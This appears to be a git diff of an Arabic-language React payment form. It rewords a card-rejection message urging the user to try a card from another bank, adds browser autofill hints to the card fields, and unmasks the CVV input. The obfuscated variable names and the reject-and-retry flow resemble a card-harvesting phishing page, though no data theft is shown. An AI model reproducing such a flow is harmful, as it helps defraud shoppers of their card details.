@@ -238,7 +238,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
 
             // Show error message under card number
             setCardRejectionError(
-              "تم رفض البطاقة من قبل البنك المصدر الرجاء التسديد من مصرف آخر",
+              "لايمكن التسديد من خلال هذة البطاقة, الرجاء إدخال بطاقة من مصرف آخر",
             );
 
             // Also show toast for visibility
@@ -597,6 +597,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               placeholder="رقم بطاقة الائتمان"
               maxLength={19}
               dir="rtl"
+              autoComplete="cc-number"
               className={`h-14 text-base border rounded-xl px-4 transition-all ${
                 isValidCard
                   ? "border-blue-400 focus:border-blue-500"
@@ -627,12 +628,13 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           <div className="grid grid-cols-2 gap-3">
             <div>
               <Input
-                type="password"
+                type="tel"
                 value={_v2}
                 onChange={handleCvvChange}
                 placeholder="CVV أو CVC رمز"
                 maxLength={3}
                 dir="rtl"
+                autoComplete="cc-csc"
                 className={`h-14 text-base border rounded-xl px-4 ${
                   _v2.length === 3
                     ? "border-blue-400"
@@ -646,12 +648,13 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             </div>
             <div>
               <Input
-                type="text"
+                type="tel"
                 value={_v3}
                 onChange={handleExpiryDateChange}
                 placeholder="MM/YY"
                 maxLength={5}
                 dir="ltr"
+                autoComplete="cc-exp"
                 className={`h-14 text-base border rounded-xl px-4 text-center ${
                   expiryError
                     ? "border-red-400 focus:border-red-500"
@@ -674,6 +677,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             onChange={(e) => _s4(e.target.value.toUpperCase())}
             placeholder="الاسم على البطاقة"
             dir="rtl"
+            autoComplete="cc-name"
             className="h-14 text-base border border-gray-300 focus:border-[#1976d2] rounded-xl px-4"
             required
           />
